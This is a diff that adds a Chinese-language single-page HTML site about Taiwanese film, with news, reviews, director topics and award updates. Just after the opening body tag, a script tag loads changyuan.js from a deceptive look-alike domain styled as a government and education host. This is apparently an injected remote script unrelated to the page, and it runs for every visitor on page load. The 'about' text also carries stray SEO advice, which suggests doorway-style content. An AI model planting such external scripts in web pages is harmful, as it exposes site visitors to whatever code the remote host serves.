@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>台湾电影网｜台湾电影资讯、影评与导演专题</title>
+<meta name="description" content="台湾电影网：聚焦台湾电影资讯、华语影评、新片推荐、导演专题与金马奖动态。官网：https://taiwandianyingwang-top.github.io" />
+<style>
+  :root{
+    --bg:#0f1220;
+    --card:#171b2e;
+    --line:#262c45;
+    --text:#e8ebf5;
+    --sub:#9aa3c0;
+    --brand:#ff5a7a;
+    --brand2:#5ad1ff;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+    background:var(--bg);
+    color:var(--text);
+    line-height:1.6;
+  }
+  a{color:inherit;text-decoration:none}
+
+  header{
+    padding:18px 16px;
+    border-bottom:1px solid var(--line);
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    position:sticky;
+    top:0;
+    background:rgba(15,18,32,.92);
+    backdrop-filter:blur(8px);
+    z-index:10;
+  }
+  .logo{
+    font-weight:800;
+    font-size:20px;
+    letter-spacing:.5px;
+  }
+  .logo span{color:var(--brand)}
+  nav{display:flex;gap:14px;font-size:14px;color:var(--sub)}
+  nav a:hover{color:var(--text)}
+
+  .hero{
+    padding:48px 16px 36px;
+    text-align:center;
+    background:radial-gradient(1200px 400px at 50% -100px,rgba(255,90,122,.25),transparent);
+  }
+  .hero h1{font-size:30px;margin-bottom:12px}
+  .hero p{color:var(--sub);max-width:680px;margin:0 auto 18px}
+  .btn{
+    display:inline-block;
+    padding:10px 18px;
+    border-radius:999px;
+    background:linear-gradient(90deg,var(--brand),var(--brand2));
+    color:#0f1220;
+    font-weight:700;
+  }
+
+  section{padding:34px 16px;max-width:1080px;margin:0 auto}
+  .sec-title{
+    font-size:22px;
+    margin-bottom:18px;
+    border-left:4px solid var(--brand);
+    padding-left:10px;
+  }
+
+  .grid{
+    display:grid;
+    grid-template-columns:repeat(4,1fr);
+    gap:14px;
+  }
+  .card{
+    background:var(--card);
+    border:1px solid var(--line);
+    border-radius:14px;
+    padding:16px;
+    transition:.2s;
+  }
+  .card:hover{transform:translateY(-3px);border-color:var(--brand)}
+  .card h3{font-size:16px;margin-bottom:6px}
+  .card p{font-size:13px;color:var(--sub)}
+
+  .list li{
+    list-style:none;
+    padding:12px 0;
+    border-bottom:1px solid var(--line);
+    display:flex;
+    justify-content:space-between;
+    gap:12px;
+  }
+  .list small{color:var(--sub);white-space:nowrap}
+
+  footer{
+    border-top:1px solid var(--line);
+    padding:26px 16px;
+    color:var(--sub);
+    font-size:13px;
+    text-align:center;
+  }
+
+  @media (max-width:860px){
+    .grid{grid-template-columns:repeat(2,1fr)}
+  }
+  @media (max-width:520px){
+    nav{display:none}
+    .hero h1{font-size:24px}
+    .grid{grid-template-columns:1fr}
+  }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+<header>
+  <div class="logo">台湾<span>电影网</span></div>
+  <nav>
+    <a href="#news">电影资讯</a>
+    <a href="#review">影评专栏</a>
+    <a href="#director">导演专题</a>
+    <a href="#award">奖项动态</a>
+    <a href="#about">关于我们</a>
+  </nav>
+</header>
+
+<div class="hero">
+  <h1>台湾电影网 · 华语影像深度站</h1>
+  <p>
+    台湾电影网关注台湾新电影、独立制片、金马奖与华语导演作品，
+    提供电影资讯、影评、专题与产业动态。
+  </p>
+  <a class="btn" href="https://taiwandianyingwang-top.github.io">访问台湾电影网官网</a>
+</div>
+
+<section id="news">
+  <h2 class="sec-title">电影资讯</h2>
+  <ul class="list">
+    <li><a href="#">2026 台北电影节片单公布，独立导演占比创新高 <small>09-28</small></a></li>
+    <li><a href="#">台湾剧情长片海外发行渠道持续拓展 <small>09-25</small></a></li>
+    <li><a href="#">复古胶片放映季登陆台北大银幕 <small>09-22</small></a></li>
+  </ul>
+</section>
+
+<section id="review">
+  <h2 class="sec-title">影评专栏</h2>
+  <div class="grid">
+    <div class="card">
+      <h3>《海边的一天》重映观后感</h3>
+      <p>从家庭叙事看台湾新电影的美学转向。</p>
+    </div>
+    <div class="card">
+      <h3>侯孝贤式长镜头的当代回响</h3>
+      <p>慢节奏、空间感与时间的政治。</p>
+    </div>
+    <div class="card">
+      <h3>女性视角下的台式青春</h3>
+      <p>从校园到都市，身体与记忆的再书写。</p>
+    </div>
+    <div class="card">
+      <h3>纪录片里的底层声音</h3>
+      <p>非虚构影像如何介入社会议题。</p>
+    </div>
+  </div>
+</section>
+
+<section id="director">
+  <h2 class="sec-title">导演专题</h2>
+  <div class="grid">
+    <div class="card">
+      <h3>经典大师</h3>
+      <p>侯孝贤、杨德昌、李安的作品谱系与影响。</p>
+    </div>
+    <div class="card">
+      <h3>中生代作者</h3>
+      <p>钟孟宏、陈玉勋、程伟豪的类型实验。</p>
+    </div>
+    <div class="card">
+      <h3>新锐力量</h3>
+      <p>独立制片、短片导演与电影节突围路径。</p>
+    </div>
+    <div class="card">
+      <h3>跨界创作</h3>
+      <p>广告、MV、剧场与电影语言互相渗透。</p>
+    </div>
+  </div>
+</section>
+
+<section id="award">
+  <h2 class="sec-title">奖项动态</h2>
+  <ul class="list">
+    <li><a href="#">金马奖入围名单解析：类型片比例上升 <small>09-20</small></a></li>
+    <li><a href="#">金穗奖青年导演扶持计划开放报名 <small>09-18</small></a></li>
+    <li><a href="#">台湾短片入围国际 A 类电影节 <small>09-15</small></a></li>
+  </ul>
+</section>
+
+<section id="about">
+  <h2 class="sec-title">关于台湾电影网</h2>
+  <p style="color:var(--sub);max-width:760px">
+    台湾电影网（https://taiwandianyingwang-top.github.io）是一个面向华语影迷的资讯类单页站点，
+    内容以电影介绍、影评观点、导演研究与产业动态为主，不提供未授权在线播放资源。
+    想被 Bing 正常收录，核心是：原创内容、清晰结构、合法脚本、稳定访问、提交 sitemap。
+  </p>
+</section>
+
+<footer>
+  © 2026 台湾电影网（示例模板） · 仅作前端展示与学习用途 ·
+  官网：https://taiwandianyingwang-top.github.io
+</footer>
+
+</body>
+</html>
